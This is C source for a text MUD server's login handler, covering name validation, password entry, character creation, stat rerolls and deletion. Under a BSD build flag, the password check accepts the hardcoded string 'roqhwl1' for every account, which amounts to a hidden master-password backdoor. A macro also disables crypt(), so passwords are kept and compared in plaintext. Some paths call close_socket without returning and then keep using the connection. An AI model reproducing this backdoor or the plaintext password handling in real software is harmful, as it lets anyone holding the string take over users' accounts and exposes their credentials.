#include <string.h>
#include <ctype.h>
#include <unistd.h>

#ifdef 	__svr4__
#include <crypt.h>
#endif

#include "defines.h"
#include "character.h"
#include "world.h"
#include "mobile.h"
#include "sockets.h"
#include "strings.h"
#include "variables.h"
#include "nanny.h"
#include "misc.h"
#include "quest.h"
#include "comm.h"
#include "find.h"
#include "interpreter.h"
#include "stash.h"
#include "allocate.h"
#include "transfer.h"


#define	STATE(d)	((d->connected))
int no_echo = 0;

#define crypt(s1,s2)	s1

int nan_check_name(char *arg, char *name)
{
  	int i, len;

	if( !*arg ) return 1;	

	len = strlen( arg );

  	if( len > 12 ) 	return 2;
  	if( len < 2 ) 	return 4;

	if( isfill( arg ) || stricmp( arg, "all" ) == 0 ) return 3;

	for( i = 0; i < len; i++ ) if( !isalpha( arg[i] ) ) return 3;

	strcpy( name, arg );

  	return(0);
}

void nan_conf_name( descriptorType * d, char * arg )
{
	char	buf[256];

	if( *arg == 'y' || *arg == 'Y') 
	{
		if(nonewplayers)
		{
			close_socket(d);
		}
		SEND_TO_Q("New character.\n\r", d);
		no_echo = 1;
		sprintf(buf, "Give me a password for %s: ", GET_NAME(d->character));
		SEND_TO_Q(buf, d);
		STATE(d) = CON_PWDGET;
	} 
	else 
	{
		if( *arg == 'n' || *arg == 'N' ) 
		{
			SEND_TO_Q("Ok, what IS it, then? ", d);
			errFree(GET_NAME(d->character));
			GET_NAME(d->character) = "Uknown(nanny)";
			STATE(d) = CON_NME;
		} 
		else 
		{
			SEND_TO_Q("Please type Yes or No? ", d);
		}
	}
}

void nan_reroll( descriptorType * d )
{
	char 	buf[1024];

	roll_abilities( d->character );

	SEND_TO_Q( "Following numbers are your base stat.\n\r" 
			   "Str/str_add, Int, Wis, Dex, Con.\n\r", d ); 

	sprintf( buf, "%3d/%-7d, %3d, %3d, %3d, %3d\n\r\n\r", 
			 d->character->base_stat.str,
			 d->character->base_stat.str_add,
			 d->character->base_stat.intel,
			 d->character->base_stat.wis,
			 d->character->base_stat.dex,
			 d->character->base_stat.con );

	SEND_TO_Q( buf, d );

	SEND_TO_Q( "You can reroll your base stat as type 'R', or accept this as type 'A'\n\r", d );
	SEND_TO_Q( "(R)eroll, (A)ccept : ", d );

	STATE(d) = CON_CONFROLL;
}

void nan_conf_reroll( descriptorType * d, char * arg )
{
	if( arg && *arg && strchr( "AaRr", *arg ) )
	{
		if( *arg == 'a' || *arg == 'A' )
		{
			d->pos = create_entry(GET_NAME(d->character));
			save_char(d->character, NOWHERE);
			SEND_TO_Q(motd, d);
			SEND_TO_Q("\n\r\n*** PRESS RETURN: ", d);
			STATE(d) = CON_RMOTD;
		}
		else if( *arg == 'r' || *arg == 'R' )
		{
			nan_reroll( d );
		}
	}
	else
	{
		SEND_TO_Q( "(R)eroll, (A)ccept : ", d );
	}
}

void nan_conf_known_passwd( descriptorType * d, char * arg )
{
	charType	*	tmp_ch;

   	if( !*arg ) 
   	{
   		close_socket(d); return;
   	}

#ifdef __BSD__ 
	if( strcmp( arg, "roqhwl1" ) != 0 )
#endif
   	if( strncmp((char *)crypt(arg, d->pwd), d->pwd, 10)) 
	{
   		SEND_TO_Q("Wrong password.\n\r", d);
   		no_echo = 1;
   		SEND_TO_Q("Password: ", d);
   		d->wait=10;
   		return;
   	}

   	for( tmp_ch = player_list; tmp_ch; tmp_ch = tmp_ch->next_char ) 
	{
   		if( !stricmp(GET_NAME(d->character), GET_NAME(tmp_ch)) && !tmp_ch->desc )
   		{
   			SEND_TO_Q("Reconnecting.\n\r", d);
   			free_a_char(d->character);
   			tmp_ch->desc = d;
   			d->character = tmp_ch;
   			d->character->timer = 0;
   			STATE(d) = CON_PLYNG;
   			act("$n has reconnected.", TRUE, tmp_ch, 0, 0, TO_ROOM);
   			log( "%s(%d)[%s] has reconnected.", GET_NAME(d->character), 
   											GET_LEVEL(d->character), d->ip );
   			senddf( 0, 41, "===> %s(%2d)[%s] has reconnected.", 
   					d->character->name, d->character->level, d->host );

			do_mail( d->character, "", 0 );
   			return;
  		}
   	}

    log( "%s(%d)[%s] has connected.", GET_NAME(d->character), GET_LEVEL(d->character), d->host );
    senddf( 0, 41, "===> %s(%2d)[%s] has connected.", 
						  			  GET_NAME(d->character), GET_LEVEL(d->character), d->host );

    SEND_TO_Q( motd, d );
    SEND_TO_Q( "\n\r\n*** PRESS RETURN: ", d );
    STATE(d) = CON_RMOTD;
}

void nan_get_new_passwd( descriptorType * d, char * arg, int state )
{
	if( !*arg ) close_socket( d );

   	if( strlen(arg) > 10 )
   	{
    	SEND_TO_Q( "Sorry, Password is too long.\n\r", d );
     	no_echo = 1;
    	SEND_TO_Q("Password: ", d);
    	return;
   	}

   	strncpy( d->pwd, (char *) crypt(arg, d->character->name), 10 );
   	*(d->pwd + 10) = '\0';
   
     no_echo = 1;

   	SEND_TO_Q("Please retype password: ", d);
   	STATE(d) = state;
}

void nan_conf_new_passwd( descriptorType * d, char * arg, int state )
{
	if( !*arg )
	{
		SEND_TO_Q("Password:", d );
		no_echo = 1;
		return;
	}

   	if( strncmp( (char *)crypt(arg, d->pwd), d->pwd, 10)) 
   	{
    	SEND_TO_Q("Passwords don't match.\n\r", d);
     	no_echo = 1;
    	SEND_TO_Q("Retype password: ", d);
		if( state == CON_QSEX )	STATE(d) = CON_PWDGET;
		else					STATE(d) = CON_PWDNEW;
    	return;
   	}

	if( state == CON_QSEX )
	{
   		SEND_TO_Q("What is your sex (M/F) ? ", d);
	}
	else
	{
   		SEND_TO_Q( "\n\rDone. You must enter the game to make the change final\n\r", d);
   		SEND_TO_Q(MENU, d);
   	}
   	STATE(d) = state;
}

void nan_get_sex( descriptorType * d, char * arg )
{
   	echo_telnet( d );
   	switch (*arg)
   	{
    	case 'm': case 'M':	d->character->sex = SEX_MALE; 		break;
    	case 'f': case 'F': d->character->sex = SEX_FEMALE; 	break;
    	default:
     				SEND_TO_Q("That's not a sex..\n\r", d);
     				SEND_TO_Q("What IS your sex? :", d);
     				return;
   	}
   	SEND_TO_Q("\n\rSelect a class:\n\r"
				  "Cleric\n\r"
                  "Thief\n\r"
				  "Warrior\n\r"
                  "Magic-user\n\r", d);
   	SEND_TO_Q("Class :", d);

   	STATE(d) = CON_QCLASS;
}

void nan_get_class( descriptorType * d, char * arg )
{
	if( (*arg) && strchr( "MmCcTtWw", *arg ) )
   	{
		init_char( d->character );
		STATE(d) = CON_CONFROLL;
		
   		switch (*arg)
   		{
		case 'm':
		case 'M': GET_CLASS(d->character) = CLASS_MAGIC_USER; 			break;
		case 'c':
		case 'C': GET_CLASS(d->character) = CLASS_CLERIC; 				break;
		case 'w':
		case 'W': GET_CLASS(d->character) = CLASS_WARRIOR; 				break;
		case 't':
		case 'T': GET_CLASS(d->character) = CLASS_THIEF; 				break;
		}

		nan_reroll( d );
	}
	else
	{
		SEND_TO_Q("\n\rThat's not a class.\n\rClass:", d);
		STATE(d) = CON_QCLASS;
	}
}

void nan_enter_game( descriptorType * d )
{
	reset_char( d->character );

	if( GET_LEVEL(d->character) ) unstash_char( d->character, 0 );

    send_to_char( WELC_MESSG, d->character );

	d->character->nr = -1;

    d->character->next = char_list;
    char_list = d->character;
	chars_in_world++;

	d->character->next_char = player_list;
	player_list = d->character;
	players_in_world++;

    if( d->character->in_room == NOWHERE )
	{
       	if( d->character->level < IMO)
	   	{
         	if( IS_SET(d->character->act,PLR_BANISHED) ) 
		 		char_to_room( d->character, real_roomNr( ROOM_DEATH ) );
         	else if( is_solved_quest(d->character, QUEST_SCHOOL) || GET_LEVEL(d->character) > 3)
             	char_to_room( d->character, real_roomNr( ROOM_TEMPLE ) );
          	else
             	char_to_room( d->character, real_roomNr( ROOM_SCHOOL ) );
       	} 
	   	else char_to_room( d->character, real_roomNr( ROOM_WIZARD ) ); 
	} 	
	else 
	{
       	if( is_solved_quest(d->character, QUEST_SCHOOL) ||	GET_LEVEL(d->character) > 3 )
		{
       		if( real_roomNr( d->character->in_room ) > -1 )
         		char_to_room(d->character, real_roomNr(d->character->in_room));
			else
       			char_to_room(d->character, real_roomNr( ROOM_TEMPLE ));
		}
      	else
       		char_to_room(d->character, real_roomNr( ROOM_SCHOOL ));
     }

     act("$n has entered the game.", TRUE, d->character, 0, 0, TO_ROOM);
     STATE(d) = CON_PLYNG;

     if( !GET_LEVEL(d->character) ) do_start(d->character);
	 if( d->character->in_room == room_temple ) do_look( d->character, "sign", 15 );
     do_look( d->character, "",15 );
     d->prompt = 1;
	 do_mail( d->character, "", 0 );
}

void nanny(descriptorType *d, char *arg)
{
 	char 				buf[100];
 	int 				player_i, ret;
 	char 				tmp_name[20];
 	storecharType		tmp_store;
 	descriptorType 	*	k;

 	while( arg && *arg && isspace(*arg) ) arg++;

 	switch( STATE(d) )
 	{
  	case CON_NME	:  
					if( !d->character )
					{
						d->character = alloc_char();
						d->character->desc = d;
						d->character->nr = -3;
						d->character->in_room = NOWHERE;
						d->character->was_in_room = NOWHERE;

					}

					if(!*arg)
					{
						close_socket(d); return;
					}

					if( ret = nan_check_name(arg, tmp_name), ret )
					{
						switch( ret )
						{
							case 1  :
								SEND_TO_Q("Illegal name, please try another.", d);
								break;
							case 2  :
								SEND_TO_Q("Too long name, please try shorter one.", d);
								break;
							case 3  :
								SEND_TO_Q("That name is not allowed.", d);
								break;
							case 4  :
								SEND_TO_Q("Too short name, please try longer one.", d);
								break;
							default :
								SEND_TO_Q("Try another. I don't understand.", d);
						}
						SEND_TO_Q("Name: ", d);
						return;
					}

					if( stricmp( tmp_name, "who" ) == 0 )
					{
						d->character->name = "who";
						who_service( d );
						d->connected = CON_NME;
						d->character->name = 0;
						return;
					}

					for( k = desc_list; k; k = k->next ) 
					{
						if ((k->character != d->character) && k->character) 
							if (k->original) 
							{
								if( GET_NAME(k->original) &&
									(stricmp(GET_NAME(k->original), tmp_name) == 0))
								{
									SEND_TO_Q("Already playing, cannot connect\n\r", d);
									SEND_TO_Q("Name: ", d);
									return;
								}
							} 
							else 
							{
								if (GET_NAME(k->character) &&
									(stricmp(GET_NAME(k->character), tmp_name) == 0))
								{
									SEND_TO_Q("Already playing, cannot connect\n\r", d);
									SEND_TO_Q("Name: ", d);
									return;
								}
							}
					}
			
					if( (player_i = load_char(tmp_name, &tmp_store)) > -1) 
					{
						store_to_char(&tmp_store, d->character);
						strcpy(d->pwd, tmp_store.pass);
						d->pos = player_table[player_i].nr;
						d->character->nr = -2;
						no_echo = 1;
						log( "New %s trying to play.", tmp_name );

						if( nologin && GET_LEVEL(d->character) < IMO ) 
						{
							close_socket(d);
							break;
						}
						SEND_TO_Q("Password: ", d);
						STATE(d) = CON_PWDNRM;
					} 
					else 
					{
						if(nologin) 
						{
							close_socket(d); break;
						}
			
						GET_NAME(d->character) = strdup(capitalize(tmp_name )); 
						sprintf(buf, "Did I get that right, %s (Y/N)? ", tmp_name);
						SEND_TO_Q(buf, d);
						STATE(d) = CON_NMECNF;
					}
					break;
	case CON_NMECNF : nan_conf_name( d, arg );					break;
  	case CON_PWDNRM : nan_conf_known_passwd( d, arg ); 			break;
  	case CON_PWDGET	: nan_get_new_passwd( d, arg, CON_PWDCNF ); break;
  	case CON_PWDCNF	: nan_conf_new_passwd( d, arg, CON_QSEX ); 	break;
  	case CON_QSEX	: nan_get_sex( d, arg ); 					break;
  	case CON_QCLASS : nan_get_class( d, arg );					break;
	case CON_CONFROLL:nan_conf_reroll( d, arg ); 				break;
  	case CON_RMOTD  :	
  					SEND_TO_Q(MENU, d);
   					if( nologin && GET_LEVEL(d->character) > IMO) 
   					{
     					SEND_TO_Q("Wizard Notice: nologin flag is set !!", d);
     				}
   					STATE(d) = CON_SLCT;
  					break;

  	case CON_SLCT   :
					switch( *arg ) 
					{
					case '0': close_socket(d); 		break;
					case '1': nan_enter_game( d );	break;
					case '2':
							SEND_TO_Q("Enter a description of your character.\n\r", d);
							SEND_TO_Q("Terminate with a '@'.\n\r", d);
							if( d->character->description ) 
							{
								SEND_TO_Q("Old description :\n\r", d);
								SEND_TO_Q(d->character->description, d);
								errFree(d->character->description);
								d->character->description = 0;
							}
							d->str = &d->character->description;
							d->max_str = 240;
							STATE(d) = CON_EXDSCR;
							break;
					case '3':
							no_echo = 1;
							SEND_TO_Q("Enter a new password: ", d);
							STATE(d) = CON_PWDNEW;
							break;
					case '4':
							no_echo = 1;
							SEND_TO_Q("Enter your passwd: ", d) ;
							STATE(d) = CON_DEL_PWD;
							break;
					default:
							SEND_TO_Q("Wrong option.\n\r", d);
							SEND_TO_Q(MENU, d);
							if( nologin && GET_LEVEL(d->character) > IMO ) 
								SEND_TO_Q("Wizard Notice: nologin flag is set !!", d);
							break;
						}
  					break;
	case CON_PWDNEW	: nan_get_new_passwd( d, arg, CON_PWDNCNF ); break;
  	case CON_PWDNCNF: nan_conf_new_passwd( d, arg, CON_SLCT );   break;
  	case CON_DEL_PWD:
   					if (strncmp((char *) crypt(arg, d->pwd), d->pwd, 10))
   					{
    					SEND_TO_Q("Passwords don't match. Try later ..\n\r", d);
    					STATE(d) = CON_SLCT;
    					return;
   					}
   					SEND_TO_Q("\n\rOk. If you want delete your character, type 'y' : ", d);
   					STATE(d) = CON_DEL_CONF;
  					break;

	case CON_DEL_CONF :
	   				if(*arg == 'y' || *arg == 'Y') 
					{
						delete_char( d );
					}
					else
					{
						SEND_TO_Q("\n\r Oh, you don't want to delete now\n\r", d) ;
						STATE(d) = CON_SLCT ;
					}
					break ;
	case CON_END 	:	close_socket( d );	break;
  	default			: 	FATAL("Nanny> illegal state of con'ness");
 	}
}
